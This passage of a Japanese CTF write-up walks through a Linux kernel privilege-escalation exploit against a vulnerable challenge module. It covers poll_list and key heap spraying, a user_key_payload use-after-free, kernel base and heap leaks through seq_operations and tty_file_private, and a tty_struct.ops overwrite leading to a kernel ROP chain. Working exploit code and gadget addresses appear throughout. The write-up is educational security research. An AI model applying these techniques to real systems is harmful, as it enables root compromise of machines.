+事前準備として、<code>add_key</code>を呼び出して<code>struct user_key_payload</code>を<code>kmalloc-32</code>に置いておきます。続いて、<code>poll</code>を542個(stackに置かれる30個 + kmalloc-4kに置かれる510個 + kmalloc-32に置かれる2個)のfdに対して呼び出します。そうすると、<code>stack --&gt; kmalloc-4k --&gt; kmalloc-32</code>の順に<code>struct poll_list</code>のリストが繋がれます。続いて、モジュールのプロックファイルに書き込むことで<code>cormon_proc_write()</code>を呼び出してNULL-byte overflowさせます。このときバッファは<code>kmalloc-4k</code>にとられるため、うまく行くと先程の<code>poll_list.next</code>ポインタの最後1byteがpartial overwriteされます。そして、そのアドレスがうまい具合だと、書き換えたあとのポインタが一番最初に準備した<code>user_key_payload</code>を指すことになります。続いて<code>poll_list</code>をfreeさせる(これはtimer expireでも、イベントを発生させるのでもどちらでもOK)ことで、リストにつながっている<code>user_key_payload</code>をfreeします。これで<code>user_key_payload</code>のUAF完成です。kbaseを読むために<code>seq_operations</code>らへんを確保して、<code>user_key_payload</code>の上に配置します。あとは<code>keyctl_read</code>でペイロードを読むことで、kbaseをleakできます。
+というようにシナリオだけ文面で考えると簡単そうですが、「うまくいくと」と書いたところをうまくさせないといけませんね。まぁスプレーでなんとかなるでしょう。
+さて、順を追ってやっていきましょう。まずは<code>add_key()</code>でkmalloc-32に鍵を置きます。なお、<code>add_key</code> syscallに対するglibc wrapperはないため、<code>libkeyutils-dev</code>等のパッケージをインストールしたあと、<code>-lkeyutils</code>を指定してビルドする必要があります。
+雑にkeyをスプレーします:</p>
+<div class="codeblock-title">spray_keys.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">void spray_keys() {
+  char *desc = calloc(0x100, 1);
+  if (desc &lt;= 0) errExit(&quot;spray_keys malloc&quot;);
+  strcpy(desc, DESC_KEY_TOBE_OVERWRITTEN_SEQOPS);
+
+  for (int ix = 0; ix != NUM_KEY_SPRAY; ++ix) {
+    memcpy(desc + strlen(DESC_KEY_TOBE_OVERWRITTEN_SEQOPS), &amp;ix, 4);
+    char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
+    memset(key_payload, 'A', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
+    key_serial_t keyid0 = add_key(&quot;user&quot;, desc, key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, KEY_SPEC_PROCESS_KEYRING);
+    if (keyid0 &lt; 0) errExit(&quot;add_key 0&quot;);
+  }
+}
+</code></pre>
+<p>すると、以下のようにヒープの中にそれらしい箇所が見つかります(<code>pt -ss AAAAAAAA -align 8 </code>)。きっとコレが<code>kmalloc-32</code>でしょう。needleとして仕込んだ<code>AAAAAAAA</code>というペイロードと、その直前がshortの<code>0x08</code>(<code>ushort datalen</code>)であることからもわかります:
+<figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163405.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure>
+ところで、<code>user_key_payload</code>が連続していないことが見て取れますね。きっと、<code>CONFIG_SLAB_FREELIST_RANDOMIZE</code>らへんが有効化されているのでしょう。
+続いて、<code>poll_list</code>を<code>kmalloc-4k</code>と<code>kmalloc-32</code>にスプレーしていきます。</p>
+<div class="codeblock-title">alloc_poll_list.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  assign_to_core(0);
+  for (int ix = 0; ix != NUM_POLLLIST_ALLOC; ++ix) {
+    if(pthread_create(&amp;threads[ix], NULL, alloc_poll_list, &amp;just_fd) != 0) errExit(&quot;pthread_create&quot;);
+  }
+</code></pre>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163411.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163418.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>今回はpollするイベントは<code>POLLERR</code>(<code>=0x0008</code>)で、使った<code>fd</code>は<code>0x00000004</code>なので、バイト列<code>0x0000000400080000</code>をニードルとして検索できます(<code>pt -sb 08000000040000000800000004000000 -align 16</code>。まぁ、<code>pt -sb fe01000004000000 -align 8</code>のほうが良さそう)。ところで、<code>struct poll_list</code>において、<code>struct pollfd[]</code>って8byteアラインされないんですね。おかげで<code>poll_list</code>がどこにも見つからない…!と発狂する羽目になりました。あ、ところでこの<code>pt</code>コマンドは<a href="https://github.com/martinradev/gdb-pt-dump">gdb-pt-dump</a>のことです。</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163424.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163430.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>さぁさぁ、とりあえずは各構造体が意図したサイズのキャッシュに入っていることが分かりました。
+この状態で、一旦NULL-byte overflowさせてみます:</p>
+<div class="codeblock-title">overflow.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">void nullbyte_overflow(void) {
+  assert(cormon_fd &gt;= 2);
+  memset(cormon_buf, 'B', 0x1000 + 0x20);
+  strcpy((char*)cormon_buf + 1, &quot;THIS_IS_CORMON_BUFFER&quot;);
+  *cormon_buf = 0x00;
+
+  if(write(cormon_fd, cormon_buf, 0x1000) != -1) errExit(&quot;nullbyte_overflow&quot;);
+  errno = 0;
+}
+</code></pre>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163436.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>うーん、確かに次のページ上のスラブオブジェクトがNULL-byte overflowされている感じはしますが、このオブジェクトは明らかに<code>struct poll_list</code>ではありません(<code>.len</code>メンバが不正)。色々と試してみた結果、<code>struct poll_list</code>を確保する回数を<code>0x10 -&gt; 0x10-2</code>回にしたらいい感じになりました。スプレーでは大事、こういう小さい調整:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163442.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>確かに<code>cormon_proc_write()</code>で確保されたバッファと<code>struct poll_list</code>が隣接し、<code>poll_list.next</code>の先頭1byteがNULL-byte overflowされていることがわかりますね。因みに、writeupによると<code>sched_setaffinity()</code>を使ってどのコアを使うかをコントロールしたほうがいいらしいです。確かにスラブキャッシュはPERCPUだから、そっちのほうが良さそう。頭いいね！
+さぁ、ここで重要なことは、overwriteされた<code>next</code>ポインタが指す先(<code>0xffff888007617500</code>)が最初に確保した<code>user_key_payload</code>になっているかどうか。且つ、最初のメンバである<code>user_key_payload.rcu</code>がNULLであるかどうかですが…:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163448.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>完璧ですね。これであとは数秒待って<code>poll</code>をタイムアウトさせることで、<code>poll_list</code>が先頭から順にfreeされていきます。<code>user_key_payload</code>もfreeされてしまいます。よって、こいつの上に新しく何らかの構造体を置いてあげましょう。<code>kmalloc-32</code>に入っていて、且つkptrを含んでいるものなら何でもいいです。今回は<code>seq_operations</code>を使ってみます:</p>
+<div class="codeblock-title">seq_operations.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  // Check all keys to leak kbase via `seq_operations`
+  char keybuf[0x100] = {0};
+  ulong leaked = 0;
+  for (int ix = 0; ix != NUM_KEY_SPRAY; ++ix) {
+    memset(keybuf, 0, 0x100);
+    if(keyctl_read(keys[ix], keybuf, 0x100) &lt; 0) errExit(&quot;keyctl_read&quot;);
+    if (strncmp(keybuf, &quot;AAAA&quot;, 4) != 0) {
+      leaked = *(ulong*)keybuf;
+    }
+  }
+  if (leaked == 0) {
+    puts(&quot;[-] Failed to leak kbase&quot;);
+    exit(1);
+  }
+  printf(&quot;[!] leaked: 0x%lx\n&quot;, leaked);
+</code></pre>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163454.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>う〜〜〜ん、panicしているので確実に悪いことはできているのですが上手くleakはできていません。gdbで見てみましょう:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163501.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>前半がoverflowされた<code>poll_lsit</code>、後半が<code>poll_list.next</code>に指されたためにfreeされて<code>user_key_payload</code>から<code>seq_operations</code>になったもの。う〜ん、一見すると良さそうですけどね。とりあえず一番最初にもっと<code>kmalloc-32</code>を飽和させておいたほうがいいんじゃないかと思い、<code>user_key_payload</code>をもっとスプレーしようとしたところ、以下のエラーになりました:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163507.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>詳しくは見ていないけど、鍵はあんまり多くは確保できなさそうなので代わりに<code>seq_operations</code>でもっとスプレーしておくようにしました。それから、<code>pthread_join()</code>する度にすぐさま<code>seq_operations</code>を確保するようにしました。しかしながら、やっぱり<code>keyctl_read()</code>でleakできない！！</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163513.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>しばらく悩んだあと<code>keyctl_read</code>のmanpageを呼んでみると以下の記述が:</p>
+<div class="codeblock-title">keyctl_read.man</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-txt">RETURN VALUE
+       On  success  keyctl_read()  returns  the amount of data placed into the buffer.  If the buffer was too small, then the size of
+       buffer required will be returned, and the contents of the buffer may have been overwritten in some undefined way.
+</code></pre>
+<p>あ、バッファサイズが小さい場合には、undefinedな動作が起こるらしい…。ということで、<code>keyctl_read()</code>に渡すバッファサイズを十分大きく(&gt;=0x4330)してもう一度やってみると:
+<figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163520.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>よさそう！</p>
+<h3>7. leak kheap via <code>tty_struct</code> / <code>tty_file_private</code></h3>
+<p>kbase leakができました。さて、どうしよう。一瞬このまま<code>user_key_payload</code>であり且つ<code>seq_operations</code>でもあるオブジェクトを<code>user_key_payload</code>としてkfreeし、<code>setxattr</code>を使って<code>seq_operations</code>内のポインタを書き換えてやればRIPが取れるじゃんと思いましたが、KPTIがある都合上stack pivotする必要があり、<strong>heapのアドレスが必要</strong>であることに気が付きました。
+とりあえずはheapのアドレスが欲しい。幸いにも、kbaseのleakに使った<code>user_key_payload</code>だったオブジェクトは、上に乗っている<code>seq_operations</code>を解放して他のオブジェクトにしてやることで再度leakをすることができます。というわけで、<code>tty_struct</code>を使いましょう。<code>/dev/ptmx</code>を開くと以下のパスに到達します:</p>
+<div class="codeblock-title">drivers/tty/pty.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">struct tty_file_private {
+    struct tty_struct *tty;
+    struct file *file;
+    struct list_head list;
+};
+
+static int ptmx_open(struct inode *inode, struct file *filp)
+{
+    struct tty_struct *tty;
+    int retval;
+    ...
+    retval = tty_alloc_file(filp);
+    ...
+    tty = tty_init_dev(ptm_driver, index);
+    ...
+    tty_add_file(tty, filp);
+    ...
+}
+
+int tty_alloc_file(struct file *file)
+{
+    struct tty_file_private *priv;
+
+    priv = kmalloc(sizeof(*priv), GFP_KERNEL);
+    file-&gt;private_data = priv;
+    return 0;
+}
+void tty_add_file(struct tty_struct *tty, struct file *file)
+{
+    struct tty_file_private *priv = file-&gt;private_data;
+
+    priv-&gt;tty = tty;
+    priv-&gt;file = file;
+    ...
+}
+</code></pre>
+<p>ここで、<code>tty_alloc_file()</code>は<code>/dev/ptmx</code>の<code>struct file</code>の<code>private_data</code>メンバに対して<code>struct tty_file_private</code>を確保して入れます。これは<code>kmalloc-32</code>から確保されます。その後、<code>tty_init_dev()</code>で<code>struct tty_struct</code>を<code>kmalloc-1024</code>から確保します。そして、<code>tty_add_file()</code>で<code>struct tty_file_private</code>内に<code>struct tty_struct</code>のアドレスを格納します。つまり、<code>kmalloc-32</code>内の<code>tty_file_private</code>をleakすることで<code>kmalloc-1024</code>のアドレスをleakすることができます。</p>
+<div class="codeblock-title">leak_heap.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  // Free all keys except UAFed key
+  for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {
+    if (keys[ix] != uafed_key) {
+      if (keyctl_revoke(keys[ix]) != 0) errExit(&quot;keyctl_revoke&quot;);
+      if (keyctl_unlink(keys[ix], KEY_SPEC_PROCESS_KEYRING) != 0) errExit(&quot;keyctl_unlink&quot;);
+    }
+  }
+
+  // Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
+  for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) {
+    if (open(&quot;/dev/ptmx&quot;, O_RDWR) &lt;= 2) errExit(&quot;open tty&quot;);
+  }
+
+  // Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
+  memset(keybuf, 0, 0x5000);
+  if(keyctl_read(uafed_key, keybuf, 0x5000) &lt;= 0) errExit(&quot;keyctl_read&quot;);
+  ulong km1024_leaked = 0;
+  ulong *tmp = (ulong*)keybuf + 1;
+  for (int ix = 0; ix != 0x4330/8 - 2 - 1; ++ix) {
+    if ((tmp[ix] &gt;&gt; (64-4*4)) == 0xFFFF &amp;&amp; tmp[ix+2] == tmp[ix+3] &amp;&amp; tmp[ix+2] != 0 &amp;&amp; (tmp[ix] &amp; 0xFF) == 0x00) { // list_head's next and prev are same
+      km1024_leaked = tmp[ix];
+      printf(&quot;[!] \t+0: 0x%lx (tty)\n&quot;, tmp[ix]);
+      printf(&quot;[!] \t+1: 0x%lx (*file)\n&quot;, tmp[ix + 1]);
+      printf(&quot;[!] \t+2: 0x%lx (list_head.next)\n&quot;, tmp[ix + 2]);
+      printf(&quot;[!] \t+3: 0x%lx (list_head.prev)\n&quot;, tmp[ix + 3]);
+      break;
+    }
+  }
+  if (km1024_leaked == 0) errExit(&quot;Failed to leak kmalloc-1024&quot;);
+  printf(&quot;[!] leaked kmalloc-1024: 0x%lx\n&quot;, km1024_leaked);
+</code></pre>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163526.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>良さそう！と思いきや、実際に表示された<code>tty</code>のアドレスを見てみると、先頭がマジックナンバー(<code>0x5401</code>)ではなかったため違うポインタでした。何度試してみても、<code>tty</code>と思わしきものは50回に1回程度しかleakできない…。うーん、何が悪いのか。UAFされた<code>user_key_payload</code>以外のkeyをfreeして代わりに<code>tty_file_private</code>を置いたあとの<code>user_key_payload</code>が以下の感じ:
+<figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163534.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>先頭32byteが<code>user_key_payload</code>で、上にはkbaseのleakに使った<code>seq_operations</code>が乗っかっています。leakできるのは<code>user_key_payload</code>よりも下の<code>0x4330</code>byte程度(これは、<code>seq_operations</code>をUAFで乗せた際に、<code>user_key_payload.datalen</code>が<code>single_next</code>のアドレスの下2byteである<code>4330</code>で上書きされるため)であるため見てみると、<code>seq_operations</code>の名残がいくつか見えますね。<code>0xa748dc1b1f063d98</code>は、おそらくフリーなスラブオブジェクト内のリストポインタが暗号化(<code>CONFIG_SLAB_FREELIST_HARDENED</code>)されているやつでしょう。このことから考えられることとしては、keyのスプレーが少なくてキャッシュ内がkeyで満たされる前に同じ領域に<code>seq_operations</code>が入ってきてしまったことが考えられます。よって、スプレーするkeyを増やしてみたところ以下の感じ:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924154912.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>偶然のような気もしますが、ランダムなQWORD(つまり、暗号化されたスラブのポインタ)と<code>0x41414141</code>(keyのペイロードとして入れた値)が同一オブジェクト内に入っているため、keyとして割り当てられていたオブジェクトがフリーされていることが分かります。しかし、フリーされたままということは<code>tty_file_private</code>をスプレーする数が少なかったということでしょうか。少し増やしてみましたが、やはりできません。悲しい。
+ここで自分のコードを見てみると…:</p>
+<div class="codeblock-title">c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">#define NUM_KEY_SPRAY 80 + 10
+#define NUM_POLLFD 30 + 510 + 1 // stack, kmalloc-4k, kmalloc-32
+#define NUM_POLLLIST_ALLOC 0x10 - 0x1
+
+key_serial_t keys[NUM_KEY_SPRAY * 5] = {0};
+for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {...}
+for (int ix = 0; ix != NUM_KEY_SPRAY * 9; ++ix) {...}
+</code></pre>
+<p><strong>馬鹿！！大馬鹿！おまわりさん、馬鹿はこいつです！捕まえちゃってください！</strong> マクロなんて所詮文字列置換なので、<code>NUM_KEY_SPRAY * 2</code>は<code>80 + 10 * 2</code>と評価されてしまいます！どうりで思った動きしないわけだよ！
+というわけで、上のバグを直して十分な<code>tty_file_private</code>を確保してみた上で、一旦kbaseをリークした直後(keyは全て解放前。UAFされたkeyの上には<code>seq_operations</code>が乗っている)のヒープを見てみるとこんな感じ:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163541.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>一番上がUAFされたkeyで、その直後にはたくさんのkeyが存在していることが分かります(paylod=<code>AAAAA</code>)。理想的な状況ですね。これでも上手くいかないのはなぜ…。ここで<code>key</code>周りのソースを見返してみます:</p>
+<div class="codeblock-title">security/keys/keyring.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">/*
+ * Clean up a keyring when it is destroyed.  Unpublish its name if it had one
+ * and dispose of its data.
+ *
+ * The garbage collector detects the final key_put(), removes the keyring from
+ * the serial number tree and then does RCU synchronisation before coming here,
+ * so we shouldn't need to worry about code poking around here with the RCU
+ * readlock held by this time.
+ */
+static void keyring_destroy(struct key *keyring) {...}
+</code></pre>
+<p><strong>あ、<code>unlink</code>後にGC(<code>security/keys/gc.c</code>)がfreeするのか…!</strong> ということは、<code>tty_file_private</code>をスプレーする前に1秒ほどsleepしてGCを待ってやるといいのではと思いやってみると:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163547.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure>
+<figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163553.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>よさそう〜〜〜！</p>
+<h3>8. get RIP by overwriting <code>tty_struct.ops</code></h3>
+<p>さて、続いてRIPをとりましょう。や、取らなくても年は越せるんですが。
+現状ですが、<code>kmalloc-32</code>にUAFされた<code>user_key_payload</code>(+上に乗っかっている<code>tty_file_private</code>)があります。このUAFを再利用して、今度はUAF writeをしましょう。具体的には、<code>poll_list</code>が<code>kmalloc-1024 -&gt; kmalloc-32</code>のリストになっている時、<code>kmalloc-32</code>をUAFで上書きし、<code>poll_list.next</code>ポインタに<code>tty_struct(kmalloc-1024)</code>のアドレスを書き込んでやります。その状態で<code>poll_list</code>をfreeすることで関係ない<code>tty_struct</code>をfreeしてやることができます。<code>tty_struct</code>をUAFできたら、あとはopsを書き換えてやればいいはず…多分…!
+というわけで、それらをしてくれるコードがこれです(3分クッキング感):</p>
+<div class="codeblock-title">.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  // Free `seq_operations`, one of which is `user_key_payload`
+  for (int ix = NUM_SEQOPERATIONS - NUM_FREE_SEQOPERATIONS; ix != NUM_SEQOPERATIONS; ++ix) {
+    close(seqops_fd[ix]);
+  }
+  puts(&quot;[+] Freeed seq_operations&quot;);
+  
+  // Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
+  assign_to_core(2);
+  neverend = 1;
+  puts(&quot;[+] spraying `poll_list` in kmalloc-32...&quot;);
+  num_threads = 0;
+  for (int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) {
+    struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t));
+    arg-&gt;fd = just_fd; arg-&gt;id = ix;
+    arg-&gt;timeout_ms = 3000; // must 1000 &lt; timeout_ms, to wait key GC
+    arg-&gt;num_size = 30 + 2;
+    if(pthread_create(&amp;threads[ix], NULL, alloc_poll_list, arg) != 0) errExit(&quot;pthread_create&quot;);
+  }
+
+  // Revoke UAFed key, which is on `poll_list` in kmalloc-32
+  puts(&quot;[+] Freeing UAFed key...&quot;);
+  free_key(uafed_key);
+  sleep(1);
+
+  // Spray keys on UAFed `poll_list`
+  puts(&quot;[+] spraying keys in kmalloc-32&quot;);
+  assert(num_keys == 0);
+  {
+    char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
+    memset(key_payload, 'X', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
+     _alloc_key_prefill_ulong_val = 0xDEADBEEF;
+
+    for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) {
+      alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
+    }
+  }
+</code></pre>
+<p><code>user_key_payload</code>を確保する前に予め<code>setxattr()</code>で<code>0xDEADBEEF</code>を書き込んでいます。これによって、<code>user_key_payload.rcu</code>がこの値になり、且つ<code>poll_list.next</code>がこの値になるはず。実行してみると…:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163558.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>??? <code>Kernel memory overwrite attempt detected to SLUB object 'filp'</code>らしいです。ソースを読んでみると、これは<code>CONFIG_HARDENED_USERCOPY</code>が有効な場合に表示される文面みたいですね。</p>
+<div class="codeblock-title">mm/usercopy.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">void __noreturn usercopy_abort(const char *name, const char *detail,
+			       bool to_user, unsigned long offset,
+			       unsigned long len)
+{
+    pr_emerg(&quot;Kernel memory %s attempt detected %s %s%s%s%s (offset %lu, size %lu)!\n&quot;,
+       to_user ? &quot;exposure&quot; : &quot;overwrite&quot;,
+       to_user ? &quot;from&quot; : &quot;to&quot;,
+       name ? : &quot;unknown?!&quot;,
+       detail ? &quot; '&quot; : &quot;&quot;, detail ? : &quot;&quot;, detail ? &quot;'&quot; : &quot;&quot;,
+       offset, len);
+    BUG();
+}
+void __check_heap_object(const void *ptr, unsigned long n, struct page *page, bool to_user)
+{
+    ...
+    usercopy_abort(&quot;SLUB object&quot;, s-&gt;name, to_user, offset, n);
+}
+</code></pre>
+<p>何回かやってみると、keyのスプレーの際に<code>filp</code>とか<code>worker_pool</code>とかいう<code>kmalloc-256</code>サイズのキャッシュへのoverwriteが検知されて落ちているみたいです。おそらくですが、<code>poll_list</code>をスプレーするスレッドを立ち上げてからすぐに<code>user_key_payload</code>をfreeさせるようにしていたため、UAFしているオブジェクトに<code>poll_list</code>が確保される前に<code>user_key_payload</code>がfreeされてしまい、<code>seq_operations</code>のfreeと相まってdouble freeになってヒープが崩壊してしまったせいなんじゃないかと思います。そこで、スレッドを立ち上げた後に少しだけsleepしてみると、とりあえずこのエラーは出なくなりました。<strong>必要なguessingは、必要です。</strong></p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163059.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>dead beef、良さそう！続いて、deadbeefをちゃんと先程leakした<code>tty_struct</code>のアドレスにしてUAFし、その後で<code>0x1000</code>サイズの<code>user_key_payload</code>をスプレーすることで全て<code>0x5401</code>(<code>tty_struct</code>のmagic number)で埋めてみると:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163604.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>うんうん、良さそう。<code>tty_struct.ops</code>も一緒に<code>0x5401</code>に書き換えたので、ちゃんと落ちてくれてますね！RIPが取れました。</p>
+<h3>9. get root by kROP on <code>tty_struct</code> itself</h3>
+<p>TTYへの<code>ioctl()</code>によって、ジャンプ直後のレジスタの値は以下のようになります:</p>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924160250.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p><code>RBX, RCX, RSI</code>は第2引数で4byte、<code>RDX, R8, R12</code>は第3引数で8byteだけ任意に指定できます。<code>RDI</code>と<code>RBP</code>と<code>R14</code>は<code>tty_struct</code>自身を指します。stack pivotをするために、<code>push RXX, JMP RYY, POP RSP</code>のようなことをしたいのですが、<code>RSI</code>達は4byteしか指定できないため使うことはできません。
+さて、みなさんも覚えておきましょう、<strong><code>tty_struct</code>はまじでROPしやすいです</strong>:</p>
+<div class="codeblock-title">payload.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">    char *key_payload = malloc(0x1000);
+    ulong *buf = (ulong*)key_payload;
+    buf[0] = 0x5401; // magic, kref (later `leave`ed and become RBP)
+    buf[1] = KADDR(0xffffffff8191515a); // dev (later become ret addr of `leave` gadget, which is `pop rsp`)
+    buf[2] = km1024_leaked + 0x50 + 0x120; // driver (MUST BE VALID) (later `pop rsp`ed)
+    buf[3] = km1024_leaked + 0x50; // ops
+
+    ulong *ops = (ulong*)(key_payload + 0x50);
+    for (int ix = 0; ix != 0x120 / 8; ++ix) { // sizeof tty_operations
+      ops[ix] = KADDR(0xffffffff81577609); // pop rsp
+    }
+
+    ulong *rop = (ulong*)((char*)ops + 0x120);
+    *rop++ = ...
+
+    assert((ulong)rop - (ulong)key_payload &lt; 516);
+</code></pre>
+<p>まず、<code>ops</code>を書き換えて<code>tty_struct + 0x50</code>を指すようにします。この領域に偽のvtableとして<code>leave</code>するガジェットのアドレスを入れておきます。すると、上で書いたように<code>RBP</code>には<code>tty_struct</code>自身のアドレスが入っているため、<code>leave</code>すると<code>tty_struct</code>のアドレスが<code>RSP</code>に入ります。この状態で<code>RET</code>すると、<code>tty_struct + 8</code>に入っているアドレスに戻ることになります。ここは<code>tty_struct.dev</code>ポインタであり、壊れてても良い値なので、ここに<code>tty_struct + 0x50 + 0x120</code>のアドレスを入れておきます。あとは、<code>+0x50 + 0x120</code>の領域に好きなROPを組んでおくだけです。本当に、ROPのためにある構造体と言っても過言ではありません。偶然magic numberもvalidでなくてはいけないポインタ(<code>+0x10: driver</code>)を壊すことなくいけます。奇跡の構造体です。
+ROP自体はこんな感じ:</p>
+<div class="codeblock-title">rop.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  *rop++ = KADDR(0xffffffff81906510); // pop rdi
